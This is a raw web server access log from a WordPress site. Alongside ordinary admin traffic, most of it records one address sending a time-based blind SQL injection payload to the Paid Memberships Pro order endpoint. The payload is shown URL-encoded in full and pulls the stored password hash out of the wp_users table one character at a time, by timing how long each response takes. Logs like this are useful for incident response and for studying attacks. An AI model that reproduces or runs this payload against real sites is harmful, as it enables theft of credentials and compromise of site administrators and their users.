171.33.4.50 - - [05/Sep/2023:02:54:46 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:46 +0000] "GET /wp-admin/about.php HTTP/1.1" 200 14613 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:46 +0000] "GET /wp-admin/images/about-header-about.svg?ver=6.1 HTTP/1.1" 200 4334 "http://www.sipress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.1.1" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:47 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:48 +0000] "GET /wp-admin/edit.php HTTP/1.1" 200 13958 "http://www.sipress.com/wp-admin/about.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 867 "http://www.sipress.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:54:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:54:49 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:54:46 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E110%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:49 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E111%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:49 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%21%3D111%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:54:49 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:51 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:54:49 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:52 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:55 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E120%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:55 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E116%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:58 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E118%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:01 +0000] "GET /wp-admin/about.php HTTP/1.1" 200 14621 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:55:02 +0000] "GET / HTTP/1.1" 200 11573 "http://www.sipress.com/wp-admin/about.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:55:02 +0000] "GET /wp-includes/css/admin-bar.min.css?ver=6.1.1 HTTP/1.1" 200 4169 "http://www.sipress.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:55:04 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 868 "http://www.sipress.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:55:04 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:55:04 +0000] "GET /wp-admin/edit-comments.php HTTP/1.1" 200 13770 "http://www.sipress.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:55:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E119%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:04 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C7%2C1%29%29%21%3D120%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:06 +0000] "GET /wordpress/ HTTP/1.1" 404 492 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:55:04 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:09 +0000] "GET /index.php/2023/08/30/hello-world/ HTTP/1.1" 200 13799 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:55:09 +0000] "GET /wp-includes/js/comment-reply.min.js?ver=6.1.1 HTTP/1.1" 200 1701 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:55:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:10 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E120%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:10 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E116%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:13 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E118%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:16 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E119%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:16 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C8%2C1%29%29%21%3D119%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:16 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:18 +0000] "GET /wp-admin/about.php HTTP/1.1" 200 14621 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:55:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 868 "http://www.sipress.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:55:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:55:16 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E48%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:19 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E72%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:20 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E60%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:23 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E66%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:26 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E69%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:29 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E70%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E71%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C9%2C1%29%29%21%3D71%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:55:34 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 868 "http://www.sipress.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:55:34 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:55:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E32%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:35 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E48%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:38 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E56%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:38 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E52%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:55:38 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E50%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
